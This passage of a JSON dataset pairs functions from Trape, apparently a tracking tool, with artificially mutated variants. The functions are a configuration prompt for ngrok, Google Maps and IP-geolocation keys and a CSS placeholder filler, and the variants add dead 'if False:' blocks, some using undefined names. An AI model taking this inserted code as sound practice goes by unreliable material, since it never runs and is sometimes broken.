      f.close()\n    else:\n        self.trape_config()",
            "def trape_config(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    utils.Go('\\x1b[H\\x1b[J')\n    utils.Go('----------------------------------------------------------')\n    utils.Go('' + ' ' + utils.Color['redBold'] + 'TRAPE' + utils.Color['white'] + ' {' + utils.Color['yellowBold'] + 'stable' + utils.Color['white'] + '}' + utils.Color['white'] + ' - ' + 'Configuration zone to use the software' + ' ' + '<' + utils.Color['white'])\n    utils.Go('----------------------------------------------------------')\n    utils.Go('| v' + utils.Color['redBold'] + self.version + utils.Color['white'] + ' |')\n    utils.Go('--------' + '\\n')\n    utils.Go(utils.Color['whiteBold'] + 'GENERAL CONFIG' + utils.Color['white'])\n    utils.Go('------')\n    utils.Go('Through this section you will configure the resources required \\nfor an effective function of trape, please complete the following steps, below. \\nKeep in mind that if the data is incorrect this tool will not work.' + utils.Color['white'])\n    utils.Go('')\n    utils.Go(utils.Color['whiteBold'] + 'NGROK TOKEN' + utils.Color['white'])\n    utils.Go('------')\n    utils.Go('In the next section you must enter your Ngrok token, if you do not have \\none register at (' + utils.Color['blueBold'] + 'https://ngrok.com' + utils.Color['white'] + '), this data is necessary for the generation of public network tunnels.')\n    utils.Go('')\n    c_nGrokToken = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' Enter your ngrok token' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n    utils.Go('')\n    utils.Go(utils.Color['whiteBold'] + 'GOOGLE API' + utils.Color['white'])\n    utils.Go('------')\n    utils.Go('You must register with the ' + utils.Color['blueBold'] + 'Google Console' + utils.Color['white'] + ', and get an API for maps and another for shortening. \\nBy having these data you complete the settings')\n    utils.Go('')\n    c_gMapsToken = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' What is your Google Maps Api Key?' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n    c_gOoglToken = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + \" Enter your Goo.gl (shortener) Api Key (leave it empty if you don't have)\" + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n    utils.Go('')\n    utils.Go(utils.Color['whiteBold'] + 'IP INFO API' + utils.Color['white'])\n    utils.Go('------')\n    utils.Go('You must register with the ' + utils.Color['blueBold'] + 'https://ipgeolocation.io' + utils.Color['white'] + ', and get an API for geolocation. \\nBy having these data you complete the settings')\n    utils.Go('')\n    c_ipinfo = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' What is your IP Info Api Key?' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n    utils.Go('')\n    utils.Go(utils.Color['greenBold'] + '-' + utils.Color['white'] + ' Congratulations! ' + utils.Color['greenBold'] + 'Successful configuration' + utils.Color['white'] + ', now enjoy Trape!' + utils.Color['white'])\n    utils.Go('')\n    time.sleep(0.4)\n    if c_nGrokToken != '' and c_gMapsToken != '':\n        v = '{\\n\\t\"ngrok_token\" : \"' + c_nGrokToken + '\",\\n\\t\"gmaps_api_key\" : \"' + c_gMapsToken + '\",\\n\\t\"gshortener_api_key\" : \"' + c_gOoglToken + '\",\\n\\t\"ipinfo_api_key\" : \"' + c_ipinfo + '\"\\n}'\n        f = open('trape.config', 'w')\n        f.write(v)\n        f.close()\n    else:\n        self.trape_config()",
            "def trape_config(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    utils.Go('\\x1b[H\\x1b[J')\n    utils.Go('----------------------------------------------------------')\n    utils.Go('' + ' ' + utils.Color['redBold'] + 'TRAPE' + utils.Color['white'] + ' {' + utils.Color['yellowBold'] + 'stable' + utils.Color['white'] + '}' + utils.Color['white'] + ' - ' + 'Configuration zone to use the software' + ' ' + '<' + utils.Color['white'])\n    utils.Go('----------------------------------------------------------')\n    utils.Go('| v' + utils.Color['redBold'] + self.version + utils.Color['white'] + ' |')\n    utils.Go('--------' + '\\n')\n    utils.Go(utils.Color['whiteBold'] + 'GENERAL CONFIG' + utils.Color['white'])\n    utils.Go('------')\n    utils.Go('Through this section you will configure the resources required \\nfor an effective function of trape, please complete the following steps, below. \\nKeep in mind that if the data is incorrect this tool will not work.' + utils.Color['white'])\n    utils.Go('')\n    utils.Go(utils.Color['whiteBold'] + 'NGROK TOKEN' + utils.Color['white'])\n    utils.Go('------')\n    utils.Go('In the next section you must enter your Ngrok token, if you do not have \\none register at (' + utils.Color['blueBold'] + 'https://ngrok.com' + utils.Color['white'] + '), this data is necessary for the generation of public network tunnels.')\n    utils.Go('')\n    c_nGrokToken = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' Enter your ngrok token' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n    utils.Go('')\n    utils.Go(utils.Color['whiteBold'] + 'GOOGLE API' + utils.Color['white'])\n    utils.Go('------')\n    utils.Go('You must register with the ' + utils.Color['blueBold'] + 'Google Console' + utils.Color['white'] + ', and get an API for maps and another for shortening. \\nBy having these data you complete the settings')\n    utils.Go('')\n    c_gMapsToken = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' What is your Google Maps Api Key?' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n    c_gOoglToken = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + \" Enter your Goo.gl (shortener) Api Key (leave it empty if you don't have)\" + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n    utils.Go('')\n    utils.Go(utils.Color['whiteBold'] + 'IP INFO API' + utils.Color['white'])\n    utils.Go('------')\n    utils.Go('You must register with the ' + utils.Color['blueBold'] + 'https://ipgeolocation.io' + utils.Color['white'] + ', and get an API for geolocation. \\nBy having these data you complete the settings')\n    utils.Go('')\n    c_ipinfo = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' What is your IP Info Api Key?' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n    utils.Go('')\n    utils.Go(utils.Color['greenBold'] + '-' + utils.Color['white'] + ' Congratulations! ' + utils.Color['greenBold'] + 'Successful configuration' + utils.Color['white'] + ', now enjoy Trape!' + utils.Color['white'])\n    utils.Go('')\n    time.sleep(0.4)\n    if c_nGrokToken != '' and c_gMapsToken != '':\n        v = '{\\n\\t\"ngrok_token\" : \"' + c_nGrokToken + '\",\\n\\t\"gmaps_api_key\" : \"' + c_gMapsToken + '\",\\n\\t\"gshortener_api_key\" : \"' + c_gOoglToken + '\",\\n\\t\"ipinfo_api_key\" : \"' + c_ipinfo + '\"\\n}'\n        f = open('trape.config', 'w')\n        f.write(v)\n        f.close()\n    else:\n        self.trape_config()",
            "def trape_config(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    utils.Go('\\x1b[H\\x1b[J')\n    utils.Go('----------------------------------------------------------')\n    utils.Go('' + ' ' + utils.Color['redBold'] + 'TRAPE' + utils.Color['white'] + ' {' + utils.Color['yellowBold'] + 'stable' + utils.Color['white'] + '}' + utils.Color['white'] + ' - ' + 'Configuration zone to use the software' + ' ' + '<' + utils.Color['white'])\n    utils.Go('----------------------------------------------------------')\n    utils.Go('| v' + utils.Color['redBold'] + self.version + utils.Color['white'] + ' |')\n    utils.Go('--------' + '\\n')\n    utils.Go(utils.Color['whiteBold'] + 'GENERAL CONFIG' + utils.Color['white'])\n    utils.Go('------')\n    utils.Go('Through this section you will configure the resources required \\nfor an effective function of trape, please complete the following steps, below. \\nKeep in mind that if the data is incorrect this tool will not work.' + utils.Color['white'])\n    utils.Go('')\n    utils.Go(utils.Color['whiteBold'] + 'NGROK TOKEN' + utils.Color['white'])\n    utils.Go('------')\n    utils.Go('In the next section you must enter your Ngrok token, if you do not have \\none register at (' + utils.Color['blueBold'] + 'https://ngrok.com' + utils.Color['white'] + '), this data is necessary for the generation of public network tunnels.')\n    utils.Go('')\n    c_nGrokToken = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' Enter your ngrok token' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n    utils.Go('')\n    utils.Go(utils.Color['whiteBold'] + 'GOOGLE API' + utils.Color['white'])\n    utils.Go('------')\n    utils.Go('You must register with the ' + utils.Color['blueBold'] + 'Google Console' + utils.Color['white'] + ', and get an API for maps and another for shortening. \\nBy having these data you complete the settings')\n    utils.Go('')\n    c_gMapsToken = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' What is your Google Maps Api Key?' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n    c_gOoglToken = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + \" Enter your Goo.gl (shortener) Api Key (leave it empty if you don't have)\" + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n    utils.Go('')\n    utils.Go(utils.Color['whiteBold'] + 'IP INFO API' + utils.Color['white'])\n    utils.Go('------')\n    utils.Go('You must register with the ' + utils.Color['blueBold'] + 'https://ipgeolocation.io' + utils.Color['white'] + ', and get an API for geolocation. \\nBy having these data you complete the settings')\n    utils.Go('')\n    c_ipinfo = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' What is your IP Info Api Key?' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n    utils.Go('')\n    utils.Go(utils.Color['greenBold'] + '-' + utils.Color['white'] + ' Congratulations! ' + utils.Color['greenBold'] + 'Successful configuration' + utils.Color['white'] + ', now enjoy Trape!' + utils.Color['white'])\n    utils.Go('')\n    time.sleep(0.4)\n    if c_nGrokToken != '' and c_gMapsToken != '':\n        v = '{\\n\\t\"ngrok_token\" : \"' + c_nGrokToken + '\",\\n\\t\"gmaps_api_key\" : \"' + c_gMapsToken + '\",\\n\\t\"gshortener_api_key\" : \"' + c_gOoglToken + '\",\\n\\t\"ipinfo_api_key\" : \"' + c_ipinfo + '\"\\n}'\n        f = open('trape.config', 'w')\n        f.write(v)\n        f.close()\n    else:\n        self.trape_config()",
            "def trape_config(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    utils.Go('\\x1b[H\\x1b[J')\n    utils.Go('----------------------------------------------------------')\n    utils.Go('' + ' ' + utils.Color['redBold'] + 'TRAPE' + utils.Color['white'] + ' {' + utils.Color['yellowBold'] + 'stable' + utils.Color['white'] + '}' + utils.Color['white'] + ' - ' + 'Configuration zone to use the software' + ' ' + '<' + utils.Color['white'])\n    utils.Go('----------------------------------------------------------')\n    utils.Go('| v' + utils.Color['redBold'] + self.version + utils.Color['white'] + ' |')\n    utils.Go('--------' + '\\n')\n    utils.Go(utils.Color['whiteBold'] + 'GENERAL CONFIG' + utils.Color['white'])\n    utils.Go('------')\n    utils.Go('Through this section you will configure the resources required \\nfor an effective function of trape, please complete the following steps, below. \\nKeep in mind that if the data is incorrect this tool will not work.' + utils.Color['white'])\n    utils.Go('')\n    utils.Go(utils.Color['whiteBold'] + 'NGROK TOKEN' + utils.Color['white'])\n    utils.Go('------')\n    utils.Go('In the next section you must enter your Ngrok token, if you do not have \\none register at (' + utils.Color['blueBold'] + 'https://ngrok.com' + utils.Color['white'] + '), this data is necessary for the generation of public network tunnels.')\n    utils.Go('')\n    c_nGrokToken = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' Enter your ngrok token' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n    utils.Go('')\n    utils.Go(utils.Color['whiteBold'] + 'GOOGLE API' + utils.Color['white'])\n    utils.Go('------')\n    utils.Go('You must register with the ' + utils.Color['blueBold'] + 'Google Console' + utils.Color['white'] + ', and get an API for maps and another for shortening. \\nBy having these data you complete the settings')\n    utils.Go('')\n    c_gMapsToken = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' What is your Google Maps Api Key?' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n    c_gOoglToken = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + \" Enter your Goo.gl (shortener) Api Key (leave it empty if you don't have)\" + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n    utils.Go('')\n    utils.Go(utils.Color['whiteBold'] + 'IP INFO API' + utils.Color['white'])\n    utils.Go('------')\n    utils.Go('You must register with the ' + utils.Color['blueBold'] + 'https://ipgeolocation.io' + utils.Color['white'] + ', and get an API for geolocation. \\nBy having these data you complete the settings')\n    utils.Go('')\n    c_ipinfo = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' What is your IP Info Api Key?' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n    utils.Go('')\n    utils.Go(utils.Color['greenBold'] + '-' + utils.Color['white'] + ' Congratulations! ' + utils.Color['greenBold'] + 'Successful configuration' + utils.Color['white'] + ', now enjoy Trape!' + utils.Color['white'])\n    utils.Go('')\n    time.sleep(0.4)\n    if c_nGrokToken != '' and c_gMapsToken != '':\n        v = '{\\n\\t\"ngrok_token\" : \"' + c_nGrokToken + '\",\\n\\t\"gmaps_api_key\" : \"' + c_gMapsToken + '\",\\n\\t\"gshortener_api_key\" : \"' + c_gOoglToken + '\",\\n\\t\"ipinfo_api_key\" : \"' + c_ipinfo + '\"\\n}'\n        f = open('trape.config', 'w')\n        f.write(v)\n        f.close()\n    else:\n        self.trape_config()"
        ]
    },
    {
        "func_name": "injectCSS_Paths",
        "original": "def injectCSS_Paths(self, code):\n    code = code.replace('[FAVICON_HREF]', self.CSSFiles[0]['src'])\n    code = code.replace('[FAVICON_PNG_HREF]', self.CSSFiles[1]['src'])\n    code = code.replace('[BASE_ICONS_HREF]', self.CSSFiles[2]['src'])\n    code = code.replace('[STYLES_HREF]', self.CSSFiles[3]['src'])\n    code = code.replace('[NORMALIZE_HREF]', self.CSSFiles[4]['src'])\n    code = code.replace('[SERVICES_ICONS_HREF]', self.CSSFiles[5]['src'])\n    return code",
        "mutated": [
            "def injectCSS_Paths(self, code):\n    if False:\n        i = 10\n    code = code.replace('[FAVICON_HREF]', self.CSSFiles[0]['src'])\n    code = code.replace('[FAVICON_PNG_HREF]', self.CSSFiles[1]['src'])\n    code = code.replace('[BASE_ICONS_HREF]', self.CSSFiles[2]['src'])\n    code = code.replace('[STYLES_HREF]', self.CSSFiles[3]['src'])\n    code = code.replace('[NORMALIZE_HREF]', self.CSSFiles[4]['src'])\n    code = code.replace('[SERVICES_ICONS_HREF]', self.CSSFiles[5]['src'])\n    return code",
            "def injectCSS_Paths(self, code):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    code = code.replace('[FAVICON_HREF]', self.CSSFiles[0]['src'])\n    code = code.replace('[FAVICON_PNG_HREF]', self.CSSFiles[1]['src'])\n    code = code.replace('[BASE_ICONS_HREF]', self.CSSFiles[2]['src'])\n    code = code.replace('[STYLES_HREF]', self.CSSFiles[3]['src'])\n    code = code.replace('[NORMALIZE_HREF]', self.CSSFiles[4]['src'])\n    code = code.replace('[SERVICES_ICONS_HREF]', self.CSSFiles[5]['src'])\n    return code",
            "def injectCSS_Paths(self, code):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    code = code.replace('[FAVICON_HREF]', self.CSSFiles[0]['src'])\n    code = code.replace('[FAVICON_PNG_HREF]', self.CSSFiles[1]['src'])\n    code = code.replace('[BASE_ICONS_HREF]', self.CSSFiles[2]['src'])\n    code = code.replace('[STYLES_HREF]', self.CSSFiles[3]['src'])\n    code = code.replace('[NORMALIZE_HREF]', self.CSSFiles[4]['src'])\n    code = code.replace('[SERVICES_ICONS_HREF]', self.CSSFiles[5]['src'])\n    return code",
            "def injectCSS_Paths(self, code):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    code = code.replace('[FAVICON_HREF]', self.CSSFiles[0]['src'])\n    code = code.replace('[FAVICON_PNG_HREF]', self.CSSFiles[1]['src'])\n    code = code.replace('[BASE_ICONS_HREF]', self.CSSFiles[2]['src'])\n    code = code.replace('[STYLES_HREF]', self.CSSFiles[3]['src'])\n    code = code.replace('[NORMALIZE_HREF]', self.CSSFiles[4]['src'])\n    code = code.replace('[SERVICES_ICONS_HREF]', self.CSSFiles[5]['src'])\n    return code",
            "def injectCSS_Paths(self, code):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    code = code.replace('[FAVICON_HREF]', self.CSSFiles[0]['src'])\n    code = code.replace('[FAVICON_PNG_HREF]', self.CSSFiles[1]['src'])\n    code = code.replace('[BASE_ICONS_HREF]', self.CSSFiles[2]['src'])\n    code = code.replace('[STYLES_HREF]', self.CSSFiles[3]['src'])\n    code = code.replace('[NORMALIZE_HREF]', self.CSSFiles[4]['src'])\n    code = code.replace('[SERVICES_ICONS_HREF]', self.CSSFiles[5]['src'])\n    return code"
        ]
    }
]